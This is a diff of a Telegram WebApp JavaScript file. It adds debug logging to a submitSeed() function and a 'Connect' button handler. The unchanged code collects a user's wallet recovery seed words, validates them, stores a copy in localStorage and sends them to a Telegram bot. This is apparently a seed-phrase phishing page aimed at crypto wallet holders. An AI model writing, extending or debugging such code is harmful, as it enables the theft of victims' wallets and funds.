@@ -25,13 +25,14 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 
 // ✅ DOM
 window.addEventListener("DOMContentLoaded", () => {
+    console.log("📦 DOMContentLoaded подія спрацювала");
+
     feather.replace();
 
     if (typeof Telegram !== "undefined" && Telegram.WebApp) {
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
 
-        // ✅ ВСТАВЛЯЄМО ПЕРЕВІРКУ ПРАЦЕЗДАТНОСТІ
         if (!window.Telegram || !Telegram.WebApp) {
             console.warn("❌ Telegram WebApp не ініціалізовано!");
         } else {
@@ -49,6 +50,7 @@ window.addEventListener("DOMContentLoaded", () => {
     }
 
     const btn = document.getElementById("submitBtn");
+    console.log("🔍 Кнопка #submitBtn:", btn);
     if (btn) {
         btn.addEventListener("click", () => {
             console.log("🔘 Кнопка 'Подключить' нажата");
@@ -148,6 +150,7 @@ function showProcessing(message) {
 
 // 🚀 submitSeed()
 function submitSeed() {
+    console.log("🚀 Запуск submitSeed()");
     clearWarning();
 
     const length = parseInt(document.getElementById("length").value);
@@ -157,12 +160,14 @@ function submitSeed() {
     const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
 
     if (words.length !== length) {
+        console.warn("❌ Причина зупинки: не вистачає слів", words);
         showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
         return;
     }
 
     const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
     if (invalidWords.length) {
+        console.warn("❌ Причина зупинки: недопустимі символи", invalidWords);
         showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
         return;
     }
@@ -186,11 +191,13 @@ function submitSeed() {
         timestamp: new Date().toISOString()
     };
 
+    console.log("📦 Payload сформовано:", payload);
+
     localStorage.setItem("payload_backup", JSON.stringify(payload));
 
     if (Telegram?.WebApp?.sendData) {
-        console.log("📤 Sending payload to bot:", payload); // ✅ додаємо лог
         Telegram.WebApp.sendData(JSON.stringify(payload));
+        console.log("✅ Payload надіслано в Telegram WebApp");
     } else {
         console.warn("❌ Telegram WebApp.sendData недоступний");
     }
